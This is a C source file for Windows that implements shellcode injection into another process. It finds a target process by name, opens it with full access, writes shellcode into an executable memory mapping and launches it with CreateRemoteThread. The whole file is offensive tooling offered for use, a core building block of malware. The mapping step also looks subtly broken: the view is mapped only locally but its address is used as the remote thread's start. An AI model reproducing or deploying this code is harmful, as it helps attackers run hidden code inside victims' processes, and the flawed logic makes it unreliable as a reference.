#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD FindProc(const char* process_name) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to create snapshot. Error: %lu\n", GetLastError());
        return 0;
    }

    PROCESSENTRY32 process_entry;
    process_entry.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(snapshot, &process_entry)) {
        printf("[-] Failed to retrieve process information. Error: %lu\n", GetLastError());
        CloseHandle(snapshot);
        return 0;
    }

    DWORD pid = 0;
    do {
        if (strcmp(process_entry.szExeFile, process_name) == 0) {
            pid = process_entry.th32ProcessID;
            printf("[+] Found process '%s' with PID %lu\n", process_name, pid);
            break;
        }
    } while (Process32Next(snapshot, &process_entry));

    CloseHandle(snapshot);
    if (pid == 0) {
        printf("[-] Process '%s' not found.\n", process_name);
    }
    return pid;
}

void execSC(const unsigned char* shellcode, size_t shellcode_size, const char* process_name) {
    DWORD pid = FindProc(process_name);
    if (pid == 0) {
        printf("[-] Error finding the PID of the mentioned process!\n");
        return;
    }

    HANDLE hprocess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hprocess == NULL) {
        printf("[-] OpenProcess failed with error %lu\n", GetLastError());
        return;
    }
    printf("[+] Successfully opened process with PID %lu\n", pid);

    HANDLE hfile = CreateFileMappingA(
        INVALID_HANDLE_VALUE,
        NULL,
        PAGE_EXECUTE_READWRITE,
        0,
        (DWORD)shellcode_size,
        NULL
    );

    if (hfile == NULL) {
        printf("[-] CreateFileMappingA failed with error %lu\n", GetLastError());
        CloseHandle(hprocess);
        return;
    }
    printf("[+] Successfully created file mapping.\n");

    void* map_address = MapViewOfFile(
        hfile,
        FILE_MAP_WRITE | FILE_MAP_EXECUTE,
        0,
        0,
        shellcode_size
    );

    if (map_address == NULL) {
        printf("[-] MapViewOfFile failed with error %lu\n", GetLastError());
        CloseHandle(hfile);
        CloseHandle(hprocess);
        return;
    }
    printf("[+] Successfully mapped view of file.\n");

    memcpy(map_address, shellcode, shellcode_size);
    printf("[+] Successfully copied shellcode to the mapped memory.\n");

    HANDLE hthread = CreateRemoteThread(
        hprocess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)map_address,
        NULL,
        0,
        NULL
    );

    if (hthread == NULL) {
        printf("[-] CreateRemoteThread failed with error %lu\n", GetLastError());
    } else {
        printf("[+] Successfully created remote thread. Waiting for it to finish...\n");
        WaitForSingleObject(hthread, INFINITE);
        CloseHandle(hthread);
        printf("[+] Remote thread completed.\n");
    }

    UnmapViewOfFile(map_address);
    printf("[+] Unmapped view of file.\n");
    CloseHandle(hfile);
    printf("[+] Closed file mapping handle.\n");
    CloseHandle(hprocess);
    printf("[+] Closed process handle.\n");
    printf("[+] Shellcode Injected.\n");
}
